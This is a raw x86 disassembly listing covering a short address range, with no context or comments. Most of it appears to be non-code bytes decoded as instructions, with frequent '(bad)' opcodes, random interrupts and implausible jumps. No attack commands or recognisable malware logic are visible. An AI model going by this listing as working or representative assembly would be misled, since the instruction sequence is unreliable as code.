  4257f9:	sbb    al,bl
  4257fb:	mov    ch,0x6b
  4257fd:	xor    DWORD PTR [ebp-0x6289ed6b],ecx
  425803:	(bad)
  425806:	std    
  425807:	xor    DWORD PTR [ebp+0x121ceca5],ecx
  42580d:	(bad)  
  42580e:	icebp  
  42580f:	(bad)  
  425810:	mov    esp,0x76897abd
  425815:	xchg   ebp,eax
  425816:	adc    dh,BYTE PTR [esi-0x6f433963]
  42581c:	add    al,0x12
  42581e:	mov    dh,0xa5
  425820:	jmp    0x42582c
  425822:	and    esp,DWORD PTR ds:0xcd7d8dcd
  425828:	lea    ecx,ds:0xcd7de6cd
  42582e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42582f:	or     eax,0x92fc352f
  425834:	shr    ebx,cl
  425836:	sub    BYTE PTR [ebx],bh
  425838:	not    DWORD PTR [ebx-0xc]
  42583b:	shr    ecx,cl
  42583d:	xchg   edx,eax
  42583e:	push   ebx
  42583f:	lock adc al,BYTE PTR [edx]
  425842:	(bad)  
  425843:	aaa    
  425844:	ficom  WORD PTR [ebx]
  425846:	or     cl,BYTE PTR [ebp+0xa113b7d]
  42584c:	(bad)  
  42584d:	or     eax,0xcd7d8dcd
  425852:	(bad)  
  425853:	or     eax,0xcd7de6cd
  425858:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425859:	or     eax,0x212113b
  42585e:	jnp    0x425897
  425860:	ficom  WORD PTR [ebx]
  425862:	das    
  425863:	inc    ebp
  425864:	add    dl,BYTE PTR [edx-0x2cd7162d]
  42586a:	out    dx,eax
  42586b:	xchg   edx,eax
  42586c:	cmp    ebx,ebp
  42586e:	cmp    eax,DWORD PTR [ebx]
  425870:	push   ebx
  425871:	or     al,0x53
  425873:	clc    
  425874:	push   ebx
  425875:	comiss xmm0,DWORD PTR [esi]
  425878:	xor    al,BYTE PTR [eax]
  42587a:	add    BYTE PTR [eax],al
  42587c:	int    0xd6
  42587e:	stc    
  42587f:	push   es
  425880:	imul   DWORD PTR [edi]
  425882:	add    eax,0x808080d1
  425887:	int    0x78
  425889:	fs int 0xe4
  42588c:	push   eax
  42588d:	fadd   QWORD PTR [edi+0x349acdff]
  425893:	int    0x6f
  425895:	and    al,0xcd
  425897:	jp     0x4258c5
  425899:	int    0xaa
  42589b:	sbb    al,0x87
  42589d:	cdq    
  42589e:	or     dl,BYTE PTR [esi+0x149acd0d]
  4258a4:	xchg   DWORD PTR [edi],ecx
  4258a6:	xchg   DWORD PTR [ecx+0xa],edi
  4258a9:	(bad)  
  4258aa:	in     eax,dx
  4258ab:	or     dh,BYTE PTR [esi-0x6b]
  4258ae:	or     dl,BYTE PTR [esi+0x7bd543f5]
  4258b4:	xchg   DWORD PTR [edx],ecx
  4258b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258b7:	cmc    
  4258b8:	cmp    ebx,edx
  4258ba:	or     dl,BYTE PTR [esi-0xa69a15b]
  4258c0:	fcom   st(4)
  4258c2:	in     al,dx
  4258c3:	xchg   ebp,ecx
  4258c5:	jbe    0x42585c
  4258c7:	int    0xa6
  4258c9:	or     eax,0x5b24bb2f
  4258ce:	inc    ebx
  4258cf:	call   0x14aa:0x436b771c
  4258d6:	ja     0x425880
  4258d8:	int    0x84
  4258da:	mov    al,0xcd
  4258dc:	xchg   esi,eax
  4258dd:	mov    ch,cl
  4258df:	and    al,0x1f
  4258e1:	or     dl,BYTE PTR [esi-0x30867803]
  4258e7:	xchg   esi,eax
  4258e8:	sbb    eax,0x9633a987
  4258ed:	mov    BYTE PTR [edx],cl
  4258ef:	jbe    0x425902
  4258f1:	or     dl,BYTE PTR [esi-0x4a89368b]
  4258f7:	push   ebx
  4258f8:	add    BYTE PTR [eax-0x2693280],0x4
  4258ff:	pusha  
  425900:	adc    dh,0x28
  425903:	jo     0x4258d2
  425905:	jbe    0x42597c
  425907:	int    0x54
  425909:	xor    BYTE PTR [ebp+0xfddd],bh
  42590f:	int    0xd6
  425911:	stc    
  425912:	int    0x8d
  425914:	in     eax,dx
  425915:	push   es
  425916:	ins    DWORD PTR es:[edi],dx
  425917:	aam    0x85
  425919:	int    0x76
  42591b:	std    
  42591c:	or     bl,BYTE PTR [ecx*8+0x76041176]
  425923:	std    
  425924:	test   BYTE PTR [eax],al
  425926:	lea    esi,[ebp-0x69321c2a]
  42592c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42592d:	push   edx
  42592e:	or     dl,BYTE PTR [esi-0xa69bc5b]
  425934:	or     dh,0xaa
  425937:	int    0x79
  425939:	test   al,0x63
  42593b:	retf   
  42593c:	rol    BYTE PTR [eax+eax*4-0x6712326a],cl
  425943:	int    0xd6
  425945:	mov    BYTE PTR [eax],al
  425947:	pop    ecx
  425948:	adc    DWORD PTR [ecx+0x76cd8080],eax
  42594e:	mov    BYTE PTR [ebp+0xfee4],bh
  425954:	int    0x7
  425956:	cmp    eax,0x3b808081
  42595b:	retf   
  42595c:	pop    esi
  42595d:	mov    BYTE PTR [eax-0x322ce8d1],ch
  425963:	shl    DWORD PTR [esi-0x327f7b2e],cl
  425969:	fwait
  42596a:	sbb    eax,0x5b808081
  42596f:	cwde   
  425970:	int    0x11
  425972:	pop    ebp
  425973:	lahf   
  425974:	xor    eax,0x4eec8080
  425979:	cmp    edi,DWORD PTR [ebp-0x48]
  42597c:	jecxz  0x425949
  42597e:	mov    eax,0xd2044a0a
  425983:	xchg   edx,eax
  425984:	add    al,0x79
  425986:	xchg   edx,eax
  425987:	das    
  425988:	mov    ebx,0x7d43b84e
  42598d:	(bad)  
  42598e:	repz cmp ebp,DWORD PTR [ebp-0x58]
  425992:	mov    eax,0x8cd920a
  425997:	sbb    eax,0x63808081
  42599c:	lds    ebx,FWORD PTR [edx+0x7cdf9cd]
  4259a2:	sbb    eax,0xd3808081
  4259a7:	jmp    0xed0be132
  4259ac:	dec    edx
  4259ad:	add    DWORD PTR [edx],eax
  4259af:	add    DWORD PTR [ecx],0xffffffeb
  4259b2:	mov    esi,0x526c8809
  4259b7:	retf   0x14a
  4259ba:	cli    
  4259bb:	sbb    dh,dl
  4259bd:	adc    BYTE PTR [ecx-0x80],bh
  4259c0:	or     ch,0x7
  4259c3:	sbb    eax,0x87808081
  4259c8:	leave  
  4259c9:	stos   BYTE PTR es:[edi],al
  4259ca:	lds    edx,FWORD PTR [esi-0x12ed1233]
  4259d0:	mov    al,0x80
  4259d2:	add    BYTE PTR [eax+0xabd5f5b],0x23
  4259d9:	and    eax,0x76c99a98
  4259de:	cmc    
  4259df:	xchg   ecx,eax
  4259e0:	aaa    
  4259e1:	ficom  WORD PTR [ebx]
  4259e3:	or     cl,BYTE PTR [ebp-0x12893607]
  4259e9:	(bad)  
  4259ea:	aaa    
  4259eb:	ficom  WORD PTR [ebx]
  4259ed:	or     cl,BYTE PTR [ebp-0x3692c4ef]
  4259f3:	jbe    0x4259b2
  4259f5:	dec    ecx
  4259f6:	and    DWORD PTR [esi-0x28936cb],eax
  4259fc:	inc    ecx
  4259fd:	and    DWORD PTR [esi-0xe8936cb],eax
  425a03:	out    0x37,al
  425a05:	ficom  WORD PTR [ebx]
  425a07:	or     cl,BYTE PTR [ebp+0x5d76c995]
  425a0d:	fidiv  WORD PTR [edi]
  425a0f:	ficom  WORD PTR [ebx]
  425a11:	or     cl,BYTE PTR [ebp-0x1289329b]
  425a17:	int    0x96
  425a19:	adc    DWORD PTR [edi],ebp
  425a1b:	inc    ebp
  425a1c:	icebp  
  425a1d:	xchg   edx,eax
  425a1e:	shl    ebx,cl
  425a20:	xchg   edx,eax
  425a21:	int    0x96
  425a23:	in     eax,dx
  425a24:	int    0xd6
  425a26:	adc    ebx,edx
  425a28:	jmp    0x4229:0xbea6c328
  425a2f:	cmp    ecx,ecx
  425a31:	cmp    esi,edi
  425a33:	push   ebx
  425a34:	jns    0x425a40
  425a36:	jbe    0x4259dd
  425a38:	iret   
  425a39:	jbe    0x4259e8
  425a3b:	or     dh,BYTE PTR [esi+0xd]
  425a3e:	int    0x76
  425a40:	or     eax,0x8621d169
  425a45:	xor    eax,0x37b680c9
  425a4a:	ficom  WORD PTR [ebx]
  425a4c:	or     bh,BYTE PTR [esp+eax*4-0x33]
  425a50:	(bad)  
  425a51:	std    
  425a52:	int    0x96
  425a54:	std    
  425a55:	cmp    ecx,DWORD PTR [edi]
  425a57:	shr    ebx,cl
  425a59:	xchg   edx,eax
  425a5a:	sar    bh,0x9c
  425a5d:	cmp    esi,ecx
  425a5f:	shr    edx,cl
  425a61:	sub    BYTE PTR [ebx+0x13],dl
  425a64:	int    0x96
  425a66:	std    
  425a67:	int    0xa6
  425a69:	std    
  425a6a:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a70:	popf   
  425a71:	shl    ebp,cl
  425a73:	sub    BYTE PTR [ebx-0x2b],dl
  425a76:	xchg   DWORD PTR [ebx],edx
  425a78:	int    0x96
  425a7a:	std    
  425a7b:	int    0xa6
  425a7d:	std    
  425a7e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a84:	popf   
  425a85:	shl    ebp,cl
  425a87:	sub    BYTE PTR [ebx-0x2b],dl
  425a8a:	xchg   DWORD PTR [ebx],edx
  425a8c:	int    0x96
  425a8e:	std    
  425a8f:	int    0xa6
  425a91:	std    
  425a92:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a98:	popf   
  425a99:	shl    ebp,cl
  425a9b:	sub    BYTE PTR [ebx-0x2b],dl
  425a9e:	xchg   DWORD PTR [ebx],edx
  425aa0:	or     cl,bh
  425aa2:	nop
  425aa3:	add    BYTE PTR [eax],al
  425aa5:	add    ch,cl
  425aa7:	lea    edi,[ebp+0x3bbd96cd]
  425aad:	icebp  
  425aae:	cmp    ecx,DWORD PTR [edi]
  425ab0:	shr    edx,cl
  425ab2:	sub    bl,dl
  425ab4:	jmp    0x425a48
  425ab6:	push   ebx
  425ab7:	adc    ecx,ebp
  425ab9:	xchg   esi,eax
  425aba:	mov    ebp,0x3bbda6cd
  425abf:	cdq    
  425ac0:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425ac6:	in     eax,0x28
  425ac8:	push   ebx
  425ac9:	aad    0xa
  425acb:	int3   
  425acc:	pop    ss
  425acd:	aam    0x0
  425acf:	add    BYTE PTR [eax],al
  425ad1:	int    0x8d
  425ad3:	dec    esp
  425ad4:	int    0x89
  425ad6:	int    0x96
  425ad8:	std    
  425ad9:	int    0xa6
  425adb:	std    
  425adc:	int    0x7e
  425ade:	jo     0x425b1b
  425ae0:	popf   
  425ae1:	cmp    ebx,DWORD PTR [ecx-0x2c6d0c2d]
  425ae7:	in     eax,0x28
  425ae9:	push   ebx
  425aea:	aad    0xa
  425aec:	int3   
  425aed:	pop    ss
  425aee:	aam    0x0
  425af0:	add    BYTE PTR [eax],al
  425af2:	int    0x8d
  425af4:	xor    ch,cl
  425af6:	xchg   esi,eax
  425af7:	xor    BYTE PTR [ebx],bh
  425af9:	icebp  
  425afa:	cmp    ecx,DWORD PTR [edi]
  425afc:	shr    edx,cl
  425afe:	sub    bl,dl
  425b00:	jmp    0x425a94
  425b02:	push   ebx
  425b03:	adc    ecx,ebp
  425b05:	xchg   esi,eax
  425b06:	std    
  425b07:	int    0xa6
  425b09:	std    
  425b0a:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425b10:	cdq    
  425b11:	shl    ebx,cl
  425b13:	xchg   edx,eax
  425b14:	shl    ebp,cl
  425b16:	sub    BYTE PTR [ebx-0x2b],dl
  425b19:	int    0xa6
  425b1b:	std    
  425b1c:	cmp    edi,DWORD PTR [ecx-0x2d]
  425b1f:	mov    ebp,0xfff40492
  425b24:	shl    ebp,cl
  425b26:	sub    BYTE PTR [ebx-0x3b],dl
  425b29:	xchg   ecx,esi
  425b2b:	int    0x76
  425b2d:	adc    al,0xa
  425b2f:	int3   
  425b30:	pop    ss
  425b31:	aam    0x0
  425b33:	add    BYTE PTR [eax],al
  425b35:	int    0x8d
  425b37:	adc    al,0x4
  425b39:	add    bh,bh
  425b3b:	shl    edx,cl
  425b3d:	sub    BYTE PTR [ebx],bh
  425b3f:	jns    0x425b14
  425b41:	mov    ebp,0xcdd35392
  425b46:	(bad)  
  425b47:	std    
  425b48:	int    0x96
  425b4a:	std    
  425b4b:	add    al,0xfb
  425b4d:	(bad)  
  425b4e:	cmp    ecx,DWORD PTR [edi]
  425b50:	shr    edx,cl
  425b52:	sub    bl,dl
  425b54:	jmp    0x425ae8
  425b56:	push   ebx
  425b57:	adc    ecx,ebp
  425b59:	xchg   esi,eax
  425b5a:	std    
  425b5b:	int    0xa6
  425b5d:	std    
  425b5e:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b64:	repz xchg edx,eax
  425b66:	shl    ebp,cl
  425b68:	sub    BYTE PTR [ebx-0x2b],dl
  425b6b:	xchg   DWORD PTR [ebx],edx
  425b6d:	int    0x96
  425b6f:	std    
  425b70:	int    0xa6
  425b72:	std    
  425b73:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b79:	in     eax,0x28
  425b7b:	shl    ebx,cl
  425b7d:	xchg   edx,eax
  425b7e:	push   ebx
  425b7f:	aad    0x87
  425b81:	adc    ecx,DWORD PTR [edx]
  425b83:	add    eax,0xd4cf
  425b88:	add    bh,cl
  425b8a:	push   es
  425b8b:	nop
  425b8c:	add    BYTE PTR [eax],al
  425b8e:	add    BYTE PTR [eax-0x33],dh
  425b91:	jbe    0x425b90
  425b93:	int    0x8d
  425b95:	std    
  425b96:	sar    bh,0x63
  425b99:	cmp    edi,DWORD PTR [ecx+0x3b]
  425b9c:	or     al,0xd3
  425b9e:	mov    ebp,0x28f2d392
  425ba3:	push   ebx
  425ba4:	shl    DWORD PTR [eax-0x33],cl
  425ba7:	jbe    0x425bd5
  425ba9:	iret   
  425baa:	or     DWORD PTR [ecx-0x80],eax
  425bad:	add    BYTE PTR [eax+0x3d01cd71],0x81
  425bb4:	add    BYTE PTR [eax-0x69ffb000],0x24
  425bbb:	int    0x8d
  425bbd:	push   esp
  425bbe:	or     al,BYTE PTR [ecx-0x32528933]
  425bc4:	lea    esi,[ebp-0x6d82bad1]
  425bca:	shr    ebx,cl
  425bcc:	xchg   edx,eax
  425bcd:	int    0x8d
  425bcf:	lods   eax,DWORD PTR ds:[esi]
  425bd0:	int    0x96
  425bd2:	mov    ch,0x3b
  425bd4:	leave  
  425bd5:	cmp    ebx,edx
  425bd7:	push   ebx
  425bd8:	icebp  
  425bd9:	bound  eax,QWORD PTR [eax]
  425bdb:	(bad)  
  425bdc:	xor    al,0xd3
  425bde:	repnz sub BYTE PTR [eax],al
  425be1:	(bad)  
  425be2:	inc    esp
  425be3:	mov    ebp,0xfb94
  425be8:	int    0x76
  425bea:	lods   eax,DWORD PTR ds:[esi]
  425beb:	int    0x8d
  425bed:	mov    ch,0x2f
  425bef:	inc    ebp
  425bf0:	jge    0x425b84
  425bf2:	shr    ebx,cl
  425bf4:	xchg   edx,eax
  425bf5:	int    0x8d
  425bf7:	lods   eax,DWORD PTR ds:[esi]
  425bf8:	int    0x96
  425bfa:	mov    ch,0x3b
  425bfc:	leave  
  425bfd:	cmp    ebx,edx
  425bff:	push   ebx
  425c00:	icebp  
  425c01:	bound  eax,QWORD PTR [eax]
  425c03:	(bad)  
  425c04:	push   esp
  425c05:	shl    edx,cl
  425c07:	sub    BYTE PTR [eax],al
  425c09:	(bad)  
  425c0a:	cmp    al,0xbd
  425c0c:	inc    esp
  425c0d:	sti    
  425c0e:	add    BYTE PTR [eax],al
  425c10:	int    0x76
  425c12:	std    
  425c13:	int    0x8d
  425c15:	std    
  425c16:	cmp    ecx,DWORD PTR [ebx+edx*8]
  425c19:	repnz sub BYTE PTR [ebx],bh
  425c1c:	jns    0x425bf1
  425c1e:	mov    ebp,0xcdd35392
  425c23:	(bad)  
  425c24:	std    
  425c25:	int    0x96
  425c27:	std    
  425c28:	cmp    ecx,DWORD PTR [edi]
  425c2a:	shr    ebx,cl
  425c2c:	xchg   edx,eax
  425c2d:	cmp    edx,ebp
  425c2f:	shr    edx,cl
  425c31:	sub    BYTE PTR [ebx+0x13],dl
  425c34:	xchg   ebx,edx
  425c36:	int    0x8d
  425c38:	std    
  425c39:	int    0x96
  425c3b:	std    
  425c3c:	cmp    ecx,DWORD PTR [edi]
  425c3e:	shr    ebx,cl
  425c40:	xchg   edx,eax
  425c41:	cmp    edx,ebp
  425c43:	shr    edx,cl
  425c45:	sub    BYTE PTR [ebx+0x13],dl
  425c48:	xchg   ebx,edx
  425c4a:	int    0x8d
  425c4c:	std    
  425c4d:	int    0x96
  425c4f:	std    
  425c50:	cmp    ecx,DWORD PTR [edi]
  425c52:	shr    ebx,cl
  425c54:	xchg   edx,eax
  425c55:	cmp    edx,ebp
  425c57:	shr    edx,cl
  425c59:	sub    BYTE PTR [ebx+0x13],dl
  425c5c:	xchg   ebx,edx
  425c5e:	or     al,BYTE PTR [esi]
  425c60:	nop
  425c61:	add    BYTE PTR [eax],al
  425c63:	add    ch,cl
  425c65:	jbe    0x425cbb
  425c67:	int    0x80
  425c69:	int    0x8d
  425c6b:	mov    ebp,0x3bbd96cd
  425c70:	(bad)  
  425c72:	aad    0xd3
  425c74:	jmp    0x425c08
  425c76:	shr    edx,cl
  425c78:	sub    BYTE PTR [ebx+0x13],dl
  425c7b:	or     al,BYTE PTR ds:0xd4cf
  425c81:	add    ch,cl
  425c83:	jbe    0x425cd1
  425c85:	int    0x80
  425c87:	int    0x8d
  425c89:	std    
  425c8a:	int    0x96
  425c8c:	std    
  425c8d:	cmp    ecx,DWORD PTR [edi]
  425c8f:	shr    ebx,cl
  425c91:	xchg   edx,eax
  425c92:	int    0x6c
  425c94:	jo     0x425cd1
  425c96:	aad    0xd3
  425c98:	jmp    0xcf05:0xa135328
  425c9f:	aam    0x0
  425ca1:	add    BYTE PTR [eax],al
  425ca3:	int    0x76
  425ca5:	sbb    al,0xcd
  425ca7:	lea    ebx,[ebx+edi*1]
  425caa:	or     al,0xd3
  425cac:	repnz sub BYTE PTR [ebx],bh
  425caf:	jns    0x425c84
  425cb1:	mov    ebp,0xcdd35392
  425cb6:	(bad)  
  425cb7:	std    
  425cb8:	int    0x96
  425cba:	std    
  425cbb:	cmp    edx,ebp
  425cbd:	cmp    ecx,DWORD PTR [edi]
  425cbf:	shr    edx,cl
  425cc1:	sub    bl,dl
  425cc3:	jmp    0x425c57
  425cc5:	push   ebx
  425cc6:	adc    ecx,ebp
  425cc8:	xchg   esi,eax
  425cc9:	std    
  425cca:	int    0xa6
  425ccc:	std    
  425ccd:	cmp    ebx,DWORD PTR [ecx+0x492f3d3]
  425cd3:	hlt    
  425cd4:	call   ebx
  425cd6:	in     eax,0x28
  425cd8:	push   ebx
  425cd9:	aad    0x87
  425cdb:	adc    ecx,DWORD PTR [edx]
  425cdd:	add    eax,0xd4cf
  425ce2:	add    ch,cl
  425ce4:	jbe    0x425ce3
  425ce6:	int    0x8d
  425ce8:	std    
  425ce9:	add    al,0x2
  425ceb:	call   ebx
  425ced:	repnz sub BYTE PTR [ebx],bh
  425cf0:	jns    0x425cc5
  425cf2:	mov    ebp,0xcdd35392
  425cf7:	(bad)  
  425cf8:	std    
  425cf9:	int    0x96
  425cfb:	std    
  425cfc:	add    al,0xfb
  425cfe:	(bad)  
  425cff:	cmp    ecx,DWORD PTR [edi]
  425d01:	shr    edx,cl
  425d03:	sub    bl,dl
  425d05:	jmp    0x425c99
  425d07:	push   ebx
  425d08:	adc    eax,DWORD PTR [edi-0x272322d]
  425d0e:	int    0x96
  425d10:	std    
  425d11:	add    al,0xfb
  425d13:	(bad)  
  425d14:	cmp    ecx,DWORD PTR [edi]
  425d16:	shr    edx,cl
  425d18:	sub    bl,dl
  425d1a:	jmp    0x425cae
  425d1c:	push   ebx
  425d1d:	adc    ecx,edi
  425d1f:	pop    ss
  425d20:	nop
  425d21:	add    BYTE PTR [eax],al
  425d23:	add    BYTE PTR [edx-0x33],ah
  425d26:	xchg   esi,eax
  425d27:	std    
  425d28:	int    0xa6
  425d2a:	std    
  425d2b:	xchg   ebx,edx
  425d2d:	cmp    ebx,DWORD PTR [ecx+0xaa58dcf]
  425d33:	int3   
  425d34:	push   es
  425d35:	aam    0x0
  425d37:	add    BYTE PTR [eax],al
  425d39:	int    0x76
  425d3b:	sub    al,0x4
  425d3d:	hlt    
  425d3e:	call   ebx
  425d40:	repz xchg edx,eax
  425d42:	shl    ebp,cl
  425d44:	sub    BYTE PTR [ebx-0x2b],dl
  425d47:	iret   
  425d48:	or     edi,ebp
  425d4a:	add    BYTE PTR [eax+0x3d01cd80],0x81
  425d51:	add    BYTE PTR [eax+0x50007162],0x0
  425d58:	xchg   esi,eax
  425d59:	and    al,0x6
  425d5b:	ins    DWORD PTR es:[edi],dx
  425d5c:	aam    0xbc
  425d5e:	int    0x76
  425d60:	in     eax,dx
  425d61:	int    0x8d
  425d63:	adc    DWORD PTR [edi],ebp
  425d65:	inc    ebp
  425d66:	jge    0x425cfa
  425d68:	shr    ebx,cl
  425d6a:	xchg   edx,eax
  425d6b:	int    0xe3
  425d6d:	int    0x7d
  425d6f:	int    0x76
  425d71:	in     eax,dx
  425d72:	int    0x96
  425d74:	adc    DWORD PTR [ebx],edi
  425d76:	fidivr DWORD PTR [ebx]
  425d78:	lock shr DWORD PTR [ebp+0x4c76cd28],cl
  425d7f:	push   ebx
  425d80:	adc    ecx,ebp
  425d82:	xor    BYTE PTR [ebx-0x76],al
  425d85:	jo     0x425d54
  425d87:	xchg   esi,eax
  425d88:	push   esp
  425d89:	in     al,dx
  425d8a:	push   esp
  425d8b:	int    0x92
  425d8d:	int    0xa6
  425d8f:	push   eax
  425d90:	retf   0x5324
  425d93:	or     DWORD PTR [eax+ecx*4],esp
  425d96:	int    0x76
  425d98:	cmc    
  425d99:	int    0x8d
  425d9b:	stc    
  425d9c:	das    
  425d9d:	inc    ebp
  425d9e:	jge    0x425d32
  425da0:	shr    ebx,cl
  425da2:	xchg   edx,eax
  425da3:	int    0x8d
  425da5:	cmc    
  425da6:	int    0xa6
  425da8:	stc    
  425da9:	cmp    ecx,ecx
  425dab:	cmp    ebx,ebp
  425dad:	shl    edx,cl
  425daf:	sub    ch,cl
  425db1:	lea    esi,[eax]
  425db3:	push   ebx
  425db4:	lds    eax,FWORD PTR [edi+0x4c76cd7d]
  425dba:	int    0x1c
  425dbc:	inc    ebx
  425dbd:	(bad)  
  425dbe:	jo     0x425dca
  425dc0:	lea    esi,[eax]
  425dc2:	or     cl,0xec
  425dc5:	xchg   ch,cl
  425dc7:	xchg   esi,eax
  425dc8:	push   esp
  425dc9:	int    0x76
  425dcb:	dec    esp
  425dcc:	int    0x4a
  425dce:	int    0x20
  425dd0:	xchg   DWORD PTR [esi-0x32e3f59c],ebx
  425dd6:	sbb    al,0xcd
  425dd8:	dec    edx
  425dd9:	xchg   ebp,ecx
  425ddb:	sub    eax,0xa808080
  425de0:	lea    esi,[eax]
  425de2:	int    0x4a
  425de4:	int    0xa6
  425de6:	push   eax
  425de7:	xor    ecx,DWORD PTR [ecx*8+0x530a88a6]
  425dee:	int    0x80
  425df0:	int    0x4a
  425df2:	xchg   DWORD PTR [esp+edi*1-0x33],edi
  425df6:	jbe    0x425de5
  425df8:	or     cl,BYTE PTR [ebp+0x118dcd0d]
  425dfe:	das    
  425dff:	inc    ebp
  425e00:	jge    0x425d94
  425e02:	shr    ebx,cl
  425e04:	xchg   edx,eax
  425e05:	int    0x8d
  425e07:	in     eax,dx
  425e08:	int    0xa6
  425e0a:	adc    DWORD PTR [ebx],edi
  425e0c:	leave  
  425e0d:	cmp    ebx,ebp
  425e0f:	shl    edx,cl
  425e11:	sub    BYTE PTR [ebx-0x3b],dl
  425e14:	or     dh,BYTE PTR [esi+0x44]
  425e17:	int    0x76
  425e19:	xor    bl,ch
  425e1b:	les    eax,FWORD PTR [ecx+0x76cd8080]
  425e21:	in     eax,dx
  425e22:	int    0x8d
  425e24:	adc    DWORD PTR [edi],ebp
  425e26:	inc    ebp
  425e27:	jge    0x425dbb
  425e29:	shr    ebx,cl
  425e2b:	xchg   edx,eax
  425e2c:	int    0x8d
  425e2e:	in     eax,dx
  425e2f:	int    0xa6
  425e31:	adc    ebx,edx
  425e33:	repnz sub ch,cl
  425e36:	lea    edx,[ebx+edi*1]
  425e39:	leave  
  425e3a:	cmp    ebx,ebp
  425e3c:	add    al,0xd3
  425e3e:	stc    
  425e3f:	push   ebx
  425e40:	(bad)
  425e43:	inc    ebx
  425e44:	shr    DWORD PTR [edi],cl
  425e46:	add    al,0xf7
  425e48:	add    BYTE PTR [eax+0x30a6cd80],0xcf
  425e4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e50:	dec    ebx
  425e51:	mov    BYTE PTR [ebx],dh
  425e53:	jge    0x425e5f
  425e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e56:	xor    al,0xa
  425e58:	lea    edi,[ecx*8+0x76cdf18d]
  425e5f:	xchg   ebp,eax
  425e60:	das    
  425e61:	inc    ebp
  425e62:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e68:	jbe    0x425e5b
  425e6a:	int    0xa6
  425e6c:	xchg   ebp,eax
  425e6d:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e73:	cmp    esi,eax
  425e75:	cmp    ebx,ebp
  425e77:	push   ebx
  425e78:	or     al,0xcd
  425e7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e7b:	stc    
  425e7c:	das    
  425e7d:	inc    ebp
  425e7e:	popf   
  425e7f:	xchg   edx,eax
  425e80:	or     dh,BYTE PTR [esi+0x54]
  425e83:	int    0x76
  425e85:	cmc    
  425e86:	push   ecx
  425e87:	out    0x54,al
  425e89:	add    al,0xd3
  425e8b:	dec    edx
  425e8c:	shr    esp,cl
  425e8e:	xchg   edx,eax
  425e8f:	int    0xa6
  425e91:	stc    
  425e92:	cmp    ebx,ebp
  425e94:	mov    DWORD PTR [esi+0x54b6d554],esp
  425e9a:	int    0xa6
  425e9c:	cmc    
  425e9d:	int    0x8d
  425e9f:	stc    
  425ea0:	das    
  425ea1:	inc    ebp
  425ea2:	or     al,0x92
  425ea4:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425eaa:	shr    ebx,cl
  425eac:	xchg   edx,eax
  425ead:	int    0x8d
  425eaf:	stc    
  425eb0:	cmp    ecx,ebx
  425eb2:	shr    DWORD PTR [ebp+0x5476cd28],cl
  425eb8:	cmp    esp,ecx
  425eba:	push   ebx
  425ebb:	fcmovne st,st(5)
  425ebd:	lea    esi,[edi+ebp*1]
  425ec0:	mov    ebx,0x2bc53389
  425ec5:	ror    ebp,cl
  425ec7:	(bad)  
  425ec8:	icebp  
  425ec9:	or     dh,BYTE PTR [esi+0x54]
  425ecc:	int    0x76
  425ece:	xchg   ebp,eax
  425ecf:	das    
  425ed0:	inc    ebp
  425ed1:	rcl    DWORD PTR [edx-0x326d422d],cl
  425ed7:	jbe    0x425eca
  425ed9:	int    0xa6
  425edb:	xchg   ebp,eax
  425edc:	shr    DWORD PTR [ebp+0x3476cd28],cl
  425ee2:	das    
  425ee3:	mov    ebx,0xa6020180
  425ee8:	cmp    ebx,ebp
  425eea:	dec    edx
  425eeb:	or     al,0x1
  425eed:	ror    DWORD PTR [edx-0x2b],cl
  425ef0:	mov    ebp,0xbdbfcb3b
  425ef5:	or     ah,BYTE PTR [ebx]
  425ef7:	and    eax,0x92d3352f
  425efc:	shr    DWORD PTR [ebp+0x37d65692],cl
  425f02:	ficom  WORD PTR [ebx]
  425f04:	cmp    ecx,DWORD PTR [esi+eiz*2]
  425f07:	fidiv  WORD PTR [edi]
  425f09:	ficom  WORD PTR [ebx]
  425f0b:	(bad)  
  425f0c:	ss inc ebx
  425f0e:	or     al,0xd6
  425f10:	cs int 0x92
  425f13:	int    0x8d
  425f15:	xor    BYTE PTR [edi+0x548dcd81],al
  425f1b:	add    al,0x64
  425f1d:	mov    BYTE PTR [eax-0x6d32ce2c],al
  425f23:	int    0x8d
  425f25:	xor    BYTE PTR [edi-0x7772327f],al
  425f2b:	xchg   DWORD PTR [esi+0x54],esi
  425f2e:	int    0x89
  425f30:	or     DWORD PTR [eax-0x6dcb89fc],0x2f3c8d00
  425f3a:	push   es
  425f3b:	and    eax,DWORD PTR [eax]
  425f3d:	add    BYTE PTR [eax],al
  425f3f:	in     al,dx
  425f40:	test   DWORD PTR [edi+0x25230abd],edi
  425f46:	int    0x76
  425f48:	adc    al,0x81
  425f4a:	jbe    0x425f90
  425f4c:	leave  
  425f4d:	jbe    0x425fbc
  425f4f:	scas   al,BYTE PTR es:[edi]
  425f50:	aaa    
  425f51:	ficom  WORD PTR [ebx]
  425f53:	or     ah,BYTE PTR [esi+0x6d76cd75]
  425f59:	int    0x8d
  425f5b:	jne    0x425f8c
  425f5d:	inc    ebp
  425f5e:	jge    0x425ef2
  425f60:	shr    ebx,cl
  425f62:	xchg   edx,eax
  425f63:	int    0x8d
  425f65:	ins    DWORD PTR es:[edi],dx
  425f66:	int    0xa6
  425f68:	jne    0x425f3d
  425f6a:	repnz sub ch,cl
  425f6d:	lea    ecx,[ebp+ecx*8-0x77]
  425f71:	cmp    ecx,ecx
  425f73:	cmp    ebx,ebp
  425f75:	push   ebx
  425f76:	(bad)
  425f79:	shl    esp,cl
  425f7b:	int    0x8d
  425f7d:	inc    esp
  425f7e:	inc    ebx
  425f7f:	mov    BYTE PTR [edi+0x54],dh
  425f82:	int    0x76
  425f84:	xor    BYTE PTR [edi+0x760a1476],al
